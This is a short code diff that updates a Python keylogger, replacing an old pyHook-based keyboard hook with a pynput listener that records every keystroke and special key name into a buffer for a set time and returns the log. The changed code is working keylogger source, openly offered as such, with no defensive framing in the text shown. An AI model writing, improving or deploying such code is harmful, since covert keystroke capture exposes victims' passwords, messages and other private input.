@@ -1,5 +1,6 @@
 from ctypes import byref, create_string_buffer, c_ulong, windll
 from io import StringIO
+from pynput import keyboard
 
 import os
 import pythoncom
@@ -48,18 +49,18 @@ class KeyLogger:
         return True
 
 def run():
-    save_stdout = sys.stdout
+    log = StringIO()
 
-    sys.stdout = StringIO()
-    kl = KeyLogger()
-    hm = pyHook.HookManager()
-    hm.KeyDown = kl.mykeystroke
-    hm.HookKeyboard()
-    while time.thread_time() < TIMEOUT:
-        pythoncom.PumpWaitingMessages()
-    log = sys.stdout.getvalue()
-    sys.stdout = save_stdout
-    return log
+    def on_press(key):
+        try:
+            log.write(key.char)
+        except AttributeError:
+            log.write(f'[{key.name}]')
+
+    with keyboard.Listener(on_press=on_press) as listener:
+        time.sleep(TIMEOUT)
+
+    return log.getvalue()
 
 if __name__ == '__main__':
     print(run())
